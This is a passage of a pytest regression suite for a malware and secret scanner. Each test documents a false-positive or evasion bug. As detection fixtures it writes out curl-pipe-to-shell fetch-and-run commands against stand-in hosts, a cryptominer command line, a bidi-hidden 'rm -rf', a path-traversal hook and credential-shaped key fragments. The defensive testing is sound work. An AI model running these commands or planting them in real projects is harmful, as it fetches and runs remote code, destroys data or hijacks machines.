"""Defects an independent end-to-end review found, each with its reproduction.

Every one of these was reachable by running the tool, and none was reachable by
running its test suite -- which is the point of keeping them together. Three
were first-run experiences: a macOS user scanning an installed tree, a typed
Python codebase, and a repository somebody had made deep.
"""

from __future__ import annotations

from typing import ClassVar

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category, Severity
from cordon_scanner.detect.binary import BinaryDetector
from cordon_scanner.detect.secrets import ASSIGNMENT, NOT_A_SECRET, names_configuration
from support import assemble

JAVA_CLASS = b"\xca\xfe\xba\xbe" + (0).to_bytes(2, "big") + (65).to_bytes(2, "big") + b"\x00" * 40
FAT_MACHO = b"\xca\xfe\xba\xbe" + (2).to_bytes(4, "big") + b"\x00" * 40
THIN_MACHO = b"\xcf\xfa\xed\xfe" + b"\x00" * 40
ELF = b"\x7fELF" + b"\x00" * 40


def flagged(root) -> set[str]:
    return {
        f.rule_id
        for f in Scanner().scan(root).findings
        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
    }


class TestASharedObjectIsMachOOnMacOs:
    """`.so` was listed only under ELF. Every compiled Python extension on a
    Mac is a Mach-O `.so`, so scanning any macOS virtualenv reported each of
    them as a file contradicting its own name -- 245 high-severity findings in
    one `site-packages`, and the first thing a Mac user would have seen."""

    @pytest.mark.parametrize("raw", [ELF, THIN_MACHO, FAT_MACHO])
    def test_neither_format_contradicts_a_dot_so(self, raw: bytes) -> None:
        found = BinaryDetector.identify(raw)
        assert BinaryDetector.mismatch("lib/_ssl.cpython-312-darwin.so", found) is None

    def test_a_dot_so_holding_a_script_still_does(self, tmp_path) -> None:
        assert (
            BinaryDetector.mismatch("lib/x.so", BinaryDetector.identify(b"#!/bin/sh\n")) is not None
        )


class TestCafebabeIsTwoFormats:
    """Java class files and Mach-O universal binaries begin with the same four
    bytes. What follows is a class-file version in one and a slice count in the
    other, and the ranges do not overlap."""

    def test_a_universal_binary_is_mach_o(self) -> None:
        assert BinaryDetector.identify(FAT_MACHO).name == "Mach-O executable"
        assert BinaryDetector.mismatch("lib/fat.dylib", BinaryDetector.identify(FAT_MACHO)) is None

    def test_a_class_file_is_still_a_class_file(self) -> None:
        assert BinaryDetector.identify(JAVA_CLASS).name == "Java class"
        assert BinaryDetector.mismatch("A.class", BinaryDetector.identify(JAVA_CLASS)) is None

    def test_a_class_file_wearing_a_dylib_name_is_reported(self) -> None:
        assert BinaryDetector.mismatch("x.dylib", BinaryDetector.identify(JAVA_CLASS)) is not None


class TestATypeAnnotationAssignsNothing:
    """`session_token: AuthenticationBackendXY` declares a type. There is no
    value in the file at all, and a typed codebase produces these by the
    hundred."""

    @pytest.mark.parametrize(
        "value",
        [
            "AuthenticationBackendXY",
            "HTTPPasswordMgrWithDefaultRealm",
            "SomeVeryLongTypeNameHere",
            "OptionalStr",
        ],
    )
    def test_a_type_name_is_not_a_credential(self, value: str) -> None:
        assert NOT_A_SECRET.match(value.encode()) is not None

    @pytest.mark.parametrize(
        "line",
        ["session_token: AuthenticationBackendXY", "passwd: HTTPPasswordMgrWithDefaultRealm"],
    )
    def test_end_to_end(self, tmp_path, line: str) -> None:
        (tmp_path / "a.py").write_text(f"{line}\n", encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    @pytest.mark.parametrize(
        "value", ["aB3kQ9mZ2xT7vL4nR8wY", "S3cr3tP4ssw0rdXyz9Qq", "glpat-AAAAAAAAAAAAAAAA"]
    )
    def test_key_material_is_still_key_material(self, value: str) -> None:
        assert NOT_A_SECRET.match(value.encode()) is None


class TestASphinxRoleIsDocumentation:
    """Prose reaches the assignment rule because the name group matches inside
    a word: "bypasses" ends in "pass" plus "es". A role after it has a colon
    and no whitespace, which is the shape the unquoted branch looks for."""

    @pytest.mark.parametrize(
        "value",
        ["meth:`cordon.registry.Registry.new`", "class:`~cordon.Scanner`", "ref:`configuration`"],
    )
    def test_a_cross_reference_is_not_a_credential(self, value: str) -> None:
        assert NOT_A_SECRET.match(value.encode()) is not None


class TestAClassStatementAssignsNothing:
    """`class AuthTokenService:` is a definition, and the assignment pattern
    read the line below it as the value.

    The operator carried `\\s*` on both sides, and `\\s` is a newline. So the
    name group matched `AuthTokenService`, the colon matched, the value became
    whatever run of non-punctuation opened the class body, and `@staticmethod`
    is thirteen characters of exactly that. Nine findings in one Django
    codebase, every one a service class, each reported as "a credential
    assigned to \'AuthTokenService\'".

    Worse than the count: a reviewer who opens the file sees a class statement
    and a decorator. Nothing in the finding can be acted on, and a rule that
    cannot be acted on is the one that gets switched off -- taking the real
    `SECRET_KEY = "..."` in the same repository with it.

    An assignment puts its value on the same line as its name. A value on a
    later line is a class body, a YAML mapping or the next statement, never the
    thing that was assigned; and the multi-line case that is real -- a literal
    built across several lines -- is matched by the assembled path, which knows
    to look for a joiner. So the fix is horizontal whitespace only, which also
    closes the `\\r` form of the same mistake.
    """

    @pytest.mark.parametrize(
        "source",
        [
            "class AuthTokenService:\n\n    @staticmethod\n    def issue():\n        return 1\n",
            "class PasswordResetView:\n\n    @property\n    def form(self):\n        return 1\n",
            "class ClientSecretRotator:\n\n    @classmethod\n    def rotate(cls):\n        return 1\n",
            "class CredentialStore:\n\n    @cached_property\n    def backend(self):\n        return 1\n",
        ],
    )
    def test_a_class_body_is_not_a_value(self, source: str) -> None:
        assert ASSIGNMENT.search(source.encode()) is None

    def test_the_same_shape_with_windows_line_endings(self) -> None:
        """`\\r` is whitespace too, so a checkout with CRLF endings produced the
        identical finding and would have survived a fix that excluded only
        `\\n`."""
        assert ASSIGNMENT.search(b"class AuthTokenService:\r\n\r\n    @staticmethod\r\n") is None

    @pytest.mark.parametrize(
        "source",
        [
            b"api_key:\n  fromEnvironmentVariable\n",
            b"password:\n  secretKeyRef.name.value\n",
        ],
    )
    def test_a_mapping_key_does_not_borrow_the_next_line(self, source: bytes) -> None:
        """The same mistake outside Python: a YAML key whose value is a nested
        block, where the first token of that block was read as the key's value.

        It needed twelve characters on the line below to reach the floor, which
        is why most manifests escaped and the ones using descriptive names did
        not. `NOT_A_SECRET` would have rejected both of these afterwards on
        shape, and that is not a reason to let the pattern match: the filter is
        a second line of defence over a list of shapes somebody thought of, and
        the first line is not reading a value that was never assigned.
        """
        assert ASSIGNMENT.search(source) is None

    @pytest.mark.parametrize(
        "line",
        [
            'DEMO_PASSWORD = "{}"',
            "SECRET_KEY: '{}'",
            "api_token={}",
            'password\t=\t"{}"',
            'client_secret  =  "{}"',
        ],
    )
    def test_an_assignment_on_one_line_still_matches(self, line: str) -> None:
        """The other half of the fix, and the half a narrowing change can break
        silently: every spacing an assignment is actually written with."""
        # Assembled: this file is scanned by the tool it tests.
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        assert ASSIGNMENT.search(line.format(value).encode()) is not None

    def test_a_service_class_scans_clean_end_to_end(self, tmp_path) -> None:
        (tmp_path / "services.py").write_text(
            "class AuthTokenService:\n"
            "\n"
            "    @staticmethod\n"
            "    def issue(user):\n"
            "        return user.pk\n"
            "\n"
            "\n"
            "class ClientSecretRotator:\n"
            "\n"
            "    @classmethod\n"
            "    def rotate(cls, account):\n"
            "        return account\n",
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_a_credential_in_the_same_file_still_fires(self, tmp_path) -> None:
        """The guard that makes the test above mean something. A fix that
        stopped the rule firing at all would pass it."""
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "settings.py").write_text(
            "class AuthTokenService:\n"
            "\n"
            "    @staticmethod\n"
            "    def issue(user):\n"
            "        return user.pk\n"
            "\n"
            "\n"
            # `SESSION_TOKEN`, not `DEMO_PASSWORD`: `demo` joined the not-real
            # vocabulary, so the old name made this guard assert nothing.
            f'SESSION_TOKEN = "{value}"\n',
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)

    def test_the_detector_version_moved_with_the_behaviour(self) -> None:
        """`ScanCache.detector_signature` is `id@version`, and it is the only
        input that invalidates a cached result when a detector's behaviour
        changes -- file content, rulepack hash and config are all unchanged by a
        fix like this one. Left alone, everyone who upgrades keeps being served
        the false positives out of the cache, and the release does nothing for
        the people who already ran a scan."""
        from cordon_scanner.detect.secrets import SecretDetector

        assert SecretDetector.version > "0.2.0"


class TestADeepTreeIsNotASilentSkip:
    """`max_path_depth` incremented a counter shared with `node_modules` and
    every configured exclusion, so it reached no finding. A payload under
    seventy directories gave `files_scanned: 1`, `complete: true`, no findings
    and exit 0 -- a one-command evasion of the whole scan."""

    @staticmethod
    def build(tmp_path, depth: int):
        deep = tmp_path
        for index in range(depth):
            deep = deep / f"d{index:02d}"
        deep.mkdir(parents=True)
        (deep / "payload.py").write_text("import os\n", encoding="utf-8")
        (tmp_path / "top.py").write_text("x = 1\n", encoding="utf-8")
        return tmp_path

    def test_the_scan_says_it_did_not_finish(self, tmp_path) -> None:
        result = Scanner().scan(self.build(tmp_path, 70))
        assert result.complete is False

    def test_and_names_what_it_could_not_reach(self, tmp_path) -> None:
        result = Scanner().scan(self.build(tmp_path, 70))
        reported = [f for f in result.findings if f.rule_id == "OPERATIONAL.WALK.TOO_DEEP"]
        assert len(reported) == 1
        assert "not examined" in reported[0].message

    def test_an_ordinary_tree_says_nothing(self, tmp_path) -> None:
        result = Scanner().scan(self.build(tmp_path, 3))
        assert result.complete is True
        assert not [f for f in result.findings if f.rule_id == "OPERATIONAL.WALK.TOO_DEEP"]


class TestTRexIsAlsoADinosaur:
    """Every other miner name in the list is a coined word. `t-rex` is a key in
    rich's emoji table, which pip vendors and many projects vendor after it."""

    def test_an_emoji_table_is_not_a_cryptominer(self, tmp_path) -> None:
        (tmp_path / "codes.py").write_text(
            'EMOJI = {\n    "t-rex": "\\U0001F996",\n    "sauropod": "\\U0001F995",\n}\n',
            encoding="utf-8",
        )
        assert "SUSPECT.CRYPTOMINER.001" not in flagged(tmp_path)

    def test_the_miner_with_its_flags_still_is(self, tmp_path) -> None:
        line = assemble("t-", "rex.exe -a ethash -o strat", "um+tcp://eth.pool.invalid:4444")
        (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)

    def test_the_unambiguous_names_are_untouched(self, tmp_path) -> None:
        line = assemble("xm", "rig --don", "ate-level 1")
        (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)


class TestCargoBuildOutputIsActuallyPruned:
    """`target/debug` and `target/release` were in a set matched against a
    single directory *name*, so neither string could ever match and Rust build
    output was never pruned at all."""

    def test_build_output_is_skipped(self, tmp_path) -> None:
        for part in ("target/debug", "target/release", "src", "mytarget"):
            (tmp_path / part).mkdir(parents=True)
        (tmp_path / "src" / "main.rs").write_text("fn main() {}\n", encoding="utf-8")
        (tmp_path / "mytarget" / "keep.rs").write_text("fn keep() {}\n", encoding="utf-8")
        for part in ("target/debug", "target/release"):
            (tmp_path / part / "app").write_text("junk\n", encoding="utf-8")

        result = Scanner().scan(tmp_path)
        assert result.stats.files_scanned == 2, "src/main.rs and mytarget/keep.rs, nothing else"

    def test_a_directory_merely_called_target_is_not(self, tmp_path) -> None:
        """`target` is an ordinary directory name in plenty of projects, so the
        relative path is what identifies the artefact directory."""
        (tmp_path / "target").mkdir()
        (tmp_path / "target" / "main.rs").write_text("fn main() {}\n", encoding="utf-8")
        assert Scanner().scan(tmp_path).stats.files_scanned == 1


class TestAnInstallHookInASubdirectory:
    """`os.path.normpath` on Windows rewrites `/` as `\\`.

    Scan paths are POSIX everywhere, so a `postinstall` naming
    `scripts/setup.js` resolved to `scripts\\setup.js`, matched nothing, and the
    file was never marked as running at install time. Every `MALWARE.*`
    composite requiring install-hook context then downgraded to its `SUSPECT.*`
    counterpart -- weaker findings on Windows for one of the commonest layouts
    there is, and silently, because a finding was still produced.

    It survived because every corpus sample put its hook at the top level,
    where there is no separator to rewrite.
    """

    KNOWN = frozenset(
        {"package.json", "postinstall.js", "scripts/setup.js", "packages/api/build/run.js"}
    )

    @staticmethod
    def resolve(manifest: str, command: str) -> set[str]:
        from cordon_scanner.core.engine import Engine
        from cordon_scanner.core.models import Hook

        hook = Hook(kind="npm", path=manifest, name="postinstall", command=command)
        return Engine._hook_script_paths(manifest, [hook], TestAnInstallHookInASubdirectory.KNOWN)

    @pytest.mark.parametrize(
        ("manifest", "command", "expected"),
        [
            ("package.json", "node scripts/setup.js", {"scripts/setup.js"}),
            ("package.json", "node ./scripts/setup.js", {"scripts/setup.js"}),
            ("package.json", "node postinstall.js", {"postinstall.js"}),
            ("packages/api/package.json", "node build/run.js", {"packages/api/build/run.js"}),
        ],
    )
    def test_a_nested_target_resolves(self, manifest, command, expected) -> None:
        assert self.resolve(manifest, command) == expected

    def test_the_resolution_does_not_depend_on_the_host_separator(self) -> None:
        """The guard that makes this platform-independent rather than merely
        passing on the platform it was written on: resolution must go through
        `posixpath`, whose behaviour is the same everywhere, and not through
        `os.path`, whose behaviour is not."""
        import ntpath
        import posixpath
        import unittest.mock

        from cordon_scanner.core import engine

        # `ntpath` is what `os.path` *is* on Windows. Substituting it here
        # reproduces the Windows result on any host: if anything in the
        # resolution still reaches for the platform's own module, this fails.
        with unittest.mock.patch.object(engine, "posixpath", posixpath):
            assert self.resolve("package.json", "node scripts/setup.js") == {"scripts/setup.js"}
        assert ntpath.normpath("scripts/setup.js") == "scripts\\setup.js", (
            "the bug this guards against: the Windows normpath rewrites the separator"
        )

    def test_traversal_out_of_the_tree_is_still_refused(self) -> None:
        assert self.resolve("package.json", "node ../../etc/evil.js") == set()


class TestASecurityToolsOwnSignatureFileIsNotObfuscated:
    """`# _$_1e42-style obfuscated identifiers` is a comment describing a pattern.

    Four HIGH findings across four repositories, every one on the same line of
    `scripts/security/scan-malware.sh` -- a list of quoted regexes a malware
    scanner greps for, with English comments beside them. Cordon read the comment
    as the thing the comment describes.

    This is the canonical false positive for the rule class. Every scanner in this
    category hits it, because a signature file is by construction a file full of
    attack signatures.

    Two conditions now. The signature must be in a file whose language could be
    the obfuscator's output -- every shape in `PACKERS` is JavaScript, and matching
    one in a shell script is a category error -- and the two identifier schemes
    need several occurrences, because `_0x4f2a` and `_$_1e42` are how an obfuscator
    NAMES things, so real output carries hundreds and one occurrence is a file
    talking about the scheme.

    Note what is deliberately NOT done: no path is exempted. A JavaScript payload
    appended to that same shell script would still be reported, because the gate is
    the language the signature belongs to and nothing about who owns the file.
    """

    SIGNATURE_FILE = (
        "#!/usr/bin/env bash\n"
        "PATTERNS=(\n"
        '  "eval\\\\(function\\\\(p,a,c,k,e,"        # Dean Edwards packer\n'
        '  "_\\\\$_[0-9a-fA-F]{3,}"                 # _$_1e42-style identifiers\n'
        '  "_0x[0-9a-f]{4,6}"                      # obfuscator.io identifiers\n'
        ")\n"
        'grep -nE "${PATTERNS[@]}" -r . || true\n'
    )

    def test_a_shell_signature_list_is_quiet(self, tmp_path) -> None:
        (tmp_path / "scan-malware.sh").write_text(self.SIGNATURE_FILE, encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)

    def test_a_python_signature_list_is_quiet(self, tmp_path) -> None:
        """The same file in another language. The fix is the language gate, so it
        must not be specific to shell."""
        (tmp_path / "signatures.py").write_text(
            "PACKERS = [\n"
            '    r"eval\\\\(function\\\\(p,a,c,k,e,",  # Dean Edwards packer\n'
            '    r"_\\\\$_[0-9a-fA-F]{3,}",           # _$_1e42-style identifiers\n'
            "]\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)

    def test_real_packer_output_still_fires(self, tmp_path) -> None:
        (tmp_path / "bundle.js").write_text(
            "eval(function(p,a,c,k,e,d){return p}('0 1',2,2,'var|x'.split('|'),0,{}))\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.PACKED.001" in flagged(tmp_path)

    def test_real_identifier_obfuscation_still_fires(self, tmp_path) -> None:
        """The count threshold, from the other side. Obfuscator output is made of
        these names, so the many-occurrence case has to keep working."""
        body = "".join(f"var _0x{i:04x} = {i};\n" for i in range(1, 40))
        (tmp_path / "app.js").write_text(body, encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.PACKED.001" in flagged(tmp_path)

    def test_one_mention_in_javascript_is_not_enough(self, tmp_path) -> None:
        """A JavaScript file that documents the scheme rather than using it -- a
        test fixture, a linter rule, a comment."""
        (tmp_path / "lint.js").write_text(
            "// Reject minified identifiers such as _0x4f2a, which review cannot read.\n"
            "export const PATTERN = /_0x[0-9a-f]{4,6}/;\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)


class TestALongLineInProseIsATable:
    """A 3,333-character architecture table reported as a long high-entropy line.

    The rule's whole reasoning is that a payload appended to a source file is often
    one long line, because that keeps it off-screen in a diff. That argument needs
    the file to be something that runs, and nothing executes a Markdown document.

    It already declined to fire on files with no identified language, on exactly
    this reasoning -- "a long line in data is what data looks like". Markdown is
    identified, so it fell through the gap. Mixed case, punctuation and pipe
    separators put any table row over the entropy floor, so tightening the floor
    would not have separated them and would have cost real detections elsewhere.
    """

    @staticmethod
    def table_row(width: int = 3_400) -> str:
        cells = [f"**`module{i}`** | Complete | Owns domain metrics (S{i})" for i in range(60)]
        row = "| " + " | ".join(cells) + " |"
        return row[:width] + "\n"

    def test_a_wide_markdown_table_is_quiet(self, tmp_path) -> None:
        (tmp_path / "DESIGN.md").write_text(
            "# Design\n\n| Module | Status | Notes |\n| --- | --- | --- |\n" + self.table_row(),
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)

    def test_the_same_line_in_javascript_still_fires(self, tmp_path) -> None:
        """The guard that keeps the exemption about prose rather than about length.
        If this stops firing, the rule has been switched off rather than scoped."""
        import secrets as _secrets

        payload = _secrets.token_urlsafe(3_000)[:3_400]
        (tmp_path / "app.js").write_text(f"const x = 1;\nconst blob = '{payload}';\n", "utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in flagged(tmp_path)

    def test_prose_is_exempt_from_length_only(self, tmp_path) -> None:
        """Bidi, escapes and the packer shapes still apply to Markdown, which is
        right: a directional override in a README is a live attack on whoever
        copies a command out of it."""
        (tmp_path / "README.md").write_text(
            f"Run this: `rm -rf {chr(0x202E)}/tmp/safe`\n", encoding="utf-8"
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" in flagged(tmp_path)


class TestANameEndingInPathHoldsAPath:
    """`REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/` at HIGH, as "a
    credential assigned to 'REFRESH_TOKEN_COOKIE_PATH'". The value is a URL path
    and the name says so.

    Matched on the NAME, and the reason is the interesting part. `NOT_A_SECRET`
    already has a path alternative; it refuses this value only because `v1` carries
    a digit and because of the trailing slash. Widening that alternative was the
    obvious fix and would have been a bad trade: a real AWS secret key looks like
    `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` -- slashes, digits,
    segment-shaped -- so a path shape permissive enough to accept a versioned URL
    accepts that too, and the rule goes quiet on the credential it exists to find.

    A name is safer ground because a developer chose it to describe the value.
    """

    @pytest.mark.parametrize(
        "name",
        [
            "REFRESH_TOKEN_COOKIE_PATH",
            "PRIVATE_KEY_PATH",
            "SECRET_KEY_FILE",
            "AUTH_TOKEN_HEADER",
            "API_KEY_PARAM",
            "PASSWORD_MIN_LENGTH",
            "JWT_ALGORITHM",
            "TOKEN_URL",
            "CREDENTIAL_PREFIX",
        ],
    )
    def test_a_configuration_name_is_not_a_credential(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize(
        "name",
        ["SECRET_KEY", "API_KEY", "DEMO_PASSWORD", "password", "auth_token", "SECRET_KEYFILE"],
    )
    def test_a_credential_name_still_is(self, name: str) -> None:
        """`KEY` is deliberately not a configuration ending, and the match is on
        whole words: `SECRET_KEYFILE` is one word ending in `keyfile`, which is not
        the same shape as `SECRET_KEY_FILE`."""
        assert not names_configuration(name)

    def test_end_to_end(self, tmp_path) -> None:
        (tmp_path / ".env.example").write_text(
            "REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/\n", encoding="utf-8"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_a_real_secret_beside_it_still_fires(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / ".env.example").write_text(
            f"REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/\nSECRET_KEY={value}\n",
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)

    def test_widening_the_path_shape_would_have_hidden_a_key(self) -> None:
        """The trade this avoided, asserted so the temptation is documented.

        An AWS secret key is slash-separated, digit-bearing and segment-shaped. A
        path alternative loose enough to accept `/api/v1/auth/token/refresh/` would
        accept this, and `NOT_A_SECRET` is consulted before anything else.
        """
        aws_shaped = assemble("wJalrXUtnFEMI/K7MDENG/", "bPxRfiCY3XAMPL3K3Y").encode()
        assert NOT_A_SECRET.match(aws_shaped) is None


class TestAPrintedCommandIsNotAnExecutedOne:
    """`spf13/cobra` reported at CRITICAL, in the MALICIOUS category, for a
    Makefile line that prints installation advice.

        ifeq (, $(shell which golangci-lint))
        $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
        endif

    That is the text shown to a developer who is missing a tool. Cordon read the
    `curl ... | sh` inside it as a dropper and reported both MALWARE.DROPPER.001 and
    SUSPECT.DROPPER.001 on the same line. An accusation of that weight against a
    printed help message is not a tuning problem: it is the finding that ends the
    conversation about adopting the tool, on one of the most depended-upon Go
    libraries there is.

    Install instructions inside diagnostics, READMEs and `echo` lines are
    everywhere, because piping a script into a shell is how a great deal of
    software documents its own installation.

    Two conditions, and the second is what stops this becoming a hole: the
    statement must be a printer, AND the match must lie entirely inside its quoted
    argument.
    """

    @staticmethod
    def suppressed(source: str) -> bool:
        import re

        from cordon_scanner.core.content import FileContent
        from cordon_scanner.detect.capability import CapabilityDetector

        raw = source.encode()
        content = FileContent(path="Makefile", raw=raw, size=len(raw))
        match = re.search(rb"curl", raw)
        assert match is not None
        return CapabilityDetector._is_printed_text(content, match.start(), match.end())

    @pytest.mark.parametrize(
        "source",
        [
            '$(warning "could not find golangci-lint, run: curl -sfL https://x.test/i | sh")\n',
            '$(info "install with: curl https://x.test/i | bash")\n',
            '\techo "To install: curl -sfL https://get.test/x | sh"\n',
            '\t@echo "run: curl https://x.test/s | bash"\n',
            'console.log("install with: curl https://x.test/i | sh")\n',
            '\techo "couldn\'t find it, run: curl https://x.test/i | sh"\n',
        ],
    )
    def test_a_printed_instruction_is_text(self, source: str) -> None:
        assert self.suppressed(source)

    @pytest.mark.parametrize(
        "source",
        [
            "curl -sfL https://x.test/i.sh | sh\n",
            # Quoted is not inert. A shell runs `$(...)` and backticks inside DOUBLE
            # quotes, so these really do fetch and execute -- the quotes are around
            # the output, not around the command. Suppressing the egress here would
            # have taken one half of the dropper composite away from a genuine
            # fetch-and-run, which is the hole the quote test alone would have left.
            '\techo "$(curl -s https://x.test/s)" | sh\n',
            '\techo "`curl -s https://x.test/s`" | sh\n',
            '$(warning "$(shell curl -s https://x.test/s)")\n',
        ],
    )
    def test_a_real_fetch_is_not_suppressed(self, source: str) -> None:
        assert not self.suppressed(source)

    def test_single_quotes_stay_inert(self) -> None:
        """Single quotes suppress substitution in every shell, so a `$(...)` inside
        them is literal text and stays suppressed."""
        assert self.suppressed("\techo 'literal $(curl https://x.test/s)'\n")

    def test_the_cobra_makefile_end_to_end(self, tmp_path) -> None:
        (tmp_path / "Makefile").write_text(
            'BIN="./bin"\n'
            "\n"
            "ifeq (, $(shell which golangci-lint))\n"
            '$(warning "could not find golangci-lint in $(PATH), run: '
            'curl -sfL https://install.test/golangci-lint.sh | sh")\n'
            "endif\n"
            "\n"
            "lint:\n"
            "\tgolangci-lint run -v\n",
            encoding="utf-8",
        )
        found = flagged(tmp_path)
        assert "MALWARE.DROPPER.001" not in found
        assert "SUSPECT.DROPPER.001" not in found

    def test_a_real_dropper_in_a_makefile_still_fires(self, tmp_path) -> None:
        """The guard. A fix that stopped the rule firing in Makefiles would pass
        the test above."""
        (tmp_path / "Makefile").write_text(
            "setup:\n\tcurl -sfL https://install.test/payload.sh | sh\n",
            encoding="utf-8",
        )
        assert {"MALWARE.DROPPER.001", "SUSPECT.DROPPER.001"} & flagged(tmp_path)


class TestACommentedOutSettingConfiguresNothing:
    """Celery's Helm chart reported at HIGH as "container adds a capability that
    escapes the sandbox", for this:

        securityContext: {}
          # capabilities:
          #   drop:
          #   - ALL

    Two things wrong at once, and the comment is the lesser of them. `drop: ALL` is
    the most hardened setting a container can have, and the rule had no `add`
    requirement -- so it was telling projects their best practice was a sandbox
    escape, commented out or not.

    The rule already carried a note about a near miss of the same kind: an earlier
    version matched the phrase "nothing to drop into at all" in a comment in this
    project's own Dockerfile, and was anchored to work around it. That is a fix per
    rule. Comments are a property of the file.
    """

    @staticmethod
    def masked(raw: bytes) -> bytes:
        from cordon_scanner.detect.config_files import ConfigDetector

        return ConfigDetector._without_comments(raw)

    def test_offsets_are_preserved(self) -> None:
        """Blanked, not removed, so every span and line number a finding reports
        still points where it pointed."""
        raw = b"a: 1  # comment\nb: 2\n"
        assert len(self.masked(raw)) == len(raw)
        assert self.masked(raw).startswith(b"a: 1  ")

    def test_a_hash_inside_quotes_is_not_a_comment(self) -> None:
        """`password: "a#b"` is a password. Blanking from that `#` would hide real
        content, and hiding content in a security scanner is a false negative."""
        # Assembled: this file is scanned by the tool it tests, and a
        # credential-shaped literal here is one the self-scan reports.
        raw = f'password: "{assemble("aB3kQ9#mZ", "2xT7vL4")}"\n'.encode()
        assert self.masked(raw) == raw

    def test_the_hardened_setting_is_not_an_escape(self, tmp_path) -> None:
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: app\n"
            '      securityContext:\n        capabilities:\n          drop: ["ALL"]\n',
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)

    def test_a_commented_block_is_not_a_setting(self, tmp_path) -> None:
        (tmp_path / "values.yaml").write_text(
            "apiVersion: v2\nsecurityContext: {}\n"
            "  # capabilities:\n  #   drop:\n  #   - ALL\n"
            "  # readOnlyRootFilesystem: true\n",
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)

    def test_a_real_capability_grant_still_fires(self, tmp_path) -> None:
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: app\n"
            '      securityContext:\n        capabilities:\n          add: ["SYS_ADMIN"]\n',
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)

    def test_cap_add_stands_alone(self, tmp_path) -> None:
        """`cap_add` and `CapAdd` already say `add` in the key."""
        (tmp_path / "docker-compose.yml").write_text(
            "apiVersion: ignored\nservices:\n  app:\n    cap_add:\n      - SYS_PTRACE\n",
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)


class TestOneCredentialIsOneFinding:
    """Celery's test keypairs came back eight times at CRITICAL, and two of those
    were the same key reported twice.

    Deduplication inside each path is by the hash of the matched VALUE, and two
    paths matching different slices of one credential do not share it: the provider
    pattern matched the PEM header, and the assembled-literal path folded the Python
    triple-quoted string around it. Different bytes, different hash, same key, and
    nothing in the report to tell a reader that from two keys.

    A post-filter rather than a guard in each path, because the duplication is
    BETWEEN paths -- which is how the first attempt at this missed it entirely.
    """

    def test_one_finding_per_key(self, tmp_path) -> None:
        from cordon_scanner.detect.secrets import SecretDetector

        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
        body = assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXeZL0gYowoK1ht2ZLCDU9vN5")
        (tmp_path / "keys.py").write_text(
            f'KEY1 = """{header}\n{body}\n{assemble("-----END RSA ", "PRIVATE KEY-----")}"""\n',
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
        assert len(keys) == 1, [f.evidence.span for f in keys]
        assert SecretDetector.version  # the detector that owns the post-filter

    def test_two_keys_are_two_findings(self, tmp_path) -> None:
        """The guard: collapsing by rule id alone would report one."""
        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
        (tmp_path / "keys.py").write_text(
            f'KEY1 = """{header}\n{assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXe")}\n"""\n'
            f'KEY2 = """{header}\n{assemble("MIICXQIBAAKBgQDdUwj1W6r", "S2R9OZDON5mk0BYfaM1it")}\n"""\n',
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
        assert len(keys) == 2, [f.evidence.span for f in keys]


class TestWhereProjectsActuallyKeepTestMaterial:
    """Celery keeps eight RSA test keypairs under `t/unit/security/`, and every
    `test`-shaped glob missed a directory called `t`.

